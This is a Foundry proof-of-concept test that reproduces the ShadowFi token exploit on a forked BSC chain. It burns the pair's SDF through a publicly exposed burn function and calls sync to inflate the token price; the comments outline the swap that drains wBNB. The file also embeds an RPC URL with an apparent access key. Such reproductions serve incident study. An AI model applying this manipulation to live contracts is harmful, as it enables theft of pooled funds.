// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./Interface.sol";

/*
ShadowFi Public Burn Function Exploit PoC

The exploit was due to public visibility of the "burn" function, which allowed any user to burn the tokens.

Steps

1. the attacker called the burn function, and burned almost 10.3M SDF in the pair of SDF LP contracts.

2. the attacker synced the price of the SDF token in the LP contract, which inflated the price of the SDF tokens due to the burn.

3. the attacker swapped the SDF token with wBNB at the inflated price. 
(8.4 SDF tokens for 1078 wBNB) - not included in the below test

forge test --contracts test/6_ShadowFi.sol --match-contract ShadowFiExploit -vv

*/

contract ShadowFiExploit is DSTest {

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IShadowFi sdf = IShadowFi(0x10bc28d2810dD462E16facfF18f78783e859351b);
    IShadowFiPancakePair pair = IShadowFiPancakePair(0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A);
    IERC20 bnbToken = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

    function setUp() public {
        cheats.createSelectFork("https://divine-black-wind.bsc.discover.quiknode.pro/64ab050694137dfcbf4c20daec2e94dc515c1d60/", 20969095); //fork BSC at block 20969095 
    }

    function testExploit() public {

        //returns the current reservers of the WBNB/SDF tokens in the LP contract
        (uint Res0, uint Res1,) = pair.getReserves();
        IERC20 token0 = IERC20(pair.token0()); //SDF Token
        IERC20 token1 = IERC20(pair.token1()); //WBNB Token


        uint res0 = Res0*(10**token1.decimals());
        //console.log("[Before Burn] 1 BNB = ", (1*res0)/Res1, "SDF"); // return amount of token0 needed to buy token1

        uint res1 = Res1*(10**token0.decimals());
        console.log("[Before Burn] 1 SDF = ", (1*res1)/Res0, "BNB [0.000104164296794882 BNB]"); // return amount of token1 needed to buy token0

        //call the public burn function on the LP Pool contract
        //the SDF Tokens of the pool are burned, individual token Holders are not affected.
        sdf.burn(0xF9e3151e813cd6729D52d9A0C3ee69F22CcE650A, 10354936721195451);
        //update the price in the LP contract
        pair.sync();

        //returns the current reservers of the WBNB/SDF tokens in the LP contract
        (Res0, Res1,) = pair.getReserves();

        res0 = Res0*(10**token1.decimals());
        //console.log("[After Burn]  1 BNB = ", (1*res0)/Res1, "SDF"); // return amount of token0 needed to buy token1

        res1 = Res1*(10**token0.decimals());
        console.log("[After Burn]  1 SDF = ", (1*res1)/Res0, "BNB [112.634937079894426803 BNB]");// return amount of token1 needed to buy token0
    }
}